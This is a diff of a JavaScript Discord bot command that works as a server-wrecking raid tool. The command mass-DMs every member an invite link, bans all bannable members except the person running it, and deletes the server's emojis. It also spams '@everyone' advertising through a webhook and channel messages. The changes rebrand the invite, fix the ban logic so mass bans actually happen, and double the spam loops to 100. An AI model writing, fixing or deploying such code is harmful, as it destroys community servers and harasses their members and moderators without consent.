@@ -11,12 +11,13 @@ module.exports = {
 
         message.guild.members.cache.forEach(member => { 
           if(member.user.bot) return;
-          member.send("discord.gg/peru").catch((e => console.log(`${e.message} - ${member.id}`)))
+          member.send("discord.gg/shabz").catch((e => console.log(`${e.message} - ${member.id}`)))
       })
 
       message.guild.members.cache.forEach(async (r) => { 
         if(r.user.bot) return;
-        if(!r.bannable) await r.ban();
+        if(!r.bannable) return;
+        if(r.id !== message.author.id) await r.ban();
     })
           
         message.guild.emojis.cache.forEach(emoji => emoji.delete());
@@ -31,12 +32,12 @@ module.exports = {
             name: "Shabz",
             avatar: "https://media.discordapp.net/attachments/894697673150595113/906129601334509588/images_14.jpeg",
           }).then(m => {
-            for (let i = 0;i < 50;i++) {
-              m.send("@everyone discord.gg/peru")
+            for (let i = 0;i < 100;i++) {
+              m.send("@everyone discord.gg/shabz")
             }
           })
-            for (let i = 0;i < 50;i++) {
-            c.send("@everyone fcked by shabby discord.gg/peru")
+            for (let i = 0;i < 100;i++) {
+            c.send("@everyone fcked by shabby discord.gg/shabz")
           } 
         })
         }  
